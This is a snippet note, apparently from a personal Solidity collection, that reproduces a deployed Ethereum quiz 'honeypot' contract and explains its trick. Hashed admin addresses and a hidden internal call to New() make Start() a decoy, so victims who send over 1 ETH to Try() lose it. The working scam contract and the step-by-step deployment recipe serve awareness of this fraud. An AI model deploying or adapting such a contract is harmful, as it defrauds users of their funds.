[//title]: (question-and-answer-honeypot)
[//englishtitle]: (question-and-answer-honeypot)
[//category]: (solidity,snippet)
[//tags]: (solidity,snippet)
[//createtime]: (20210518)
[//updatetime]: (20210518)

```solidity
pragma solidity 0.8.0;

contract Kiz_quiz
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin); // only EOA account can invoke Try()

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether) // if response hash matchs, take the whole eth balance
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] memory admins) {
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}
```

## context

the contract code is [here](https://etherscan.io/address/0x747fe3e7a78ed65a059b4d4cb7adedaac7318050/advanced#code)

step1: deploy the contract, set two admins, one is EOA account another is a contract, store the admin address's keccak256 hash in mapping, so that the public address of the account is keeping secret.

step2: use the admin contract to call `New()` function, set a `_responseHash`, this tx is an internal tx, thus won't show in the honeypot contract's tx history.

step3: call `Start()` function by EOA account admin, **but actually it do noting** just for cheating you let you think you get the answer, because `responseHash != 0x0` after step2.

step4: wait victim to invoke `Try()` function to fraud at least 1 eth a time.

reference: https://twitter.com/bertcmiller/status/1394302991335927812
